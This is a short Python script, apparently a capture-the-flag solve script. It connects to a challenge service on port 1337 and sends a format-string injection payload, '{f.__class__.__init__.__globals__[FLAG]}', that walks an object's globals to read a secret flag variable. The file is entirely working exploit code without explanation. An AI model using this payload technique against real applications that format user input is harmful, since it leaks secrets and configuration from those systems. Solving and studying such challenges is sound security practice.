#!/usr/bin/python3
import socket
import os

def recv_until(sock, until):
    buf = b""
    c = sock.recv(1)
    while c:
        buf += c
        if buf.endswith(until): break
        c = sock.recv(1)
    return buf

remote = (os.environ.get("HOST", "127.0.0.1"), 1337)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(2)
sock.connect(remote)

print(recv_until(sock, b"favorite: ").decode())
sock.send(b'x\n')

print(recv_until(sock, b"Format:\n").decode())
sock.send(b'{f.__class__.__init__.__globals__[FLAG]}\nF\n')

print(recv_until(sock, b"Favorite: ").decode())
sock.send(b'Flutter\n')

print(sock.recv(1024).decode())
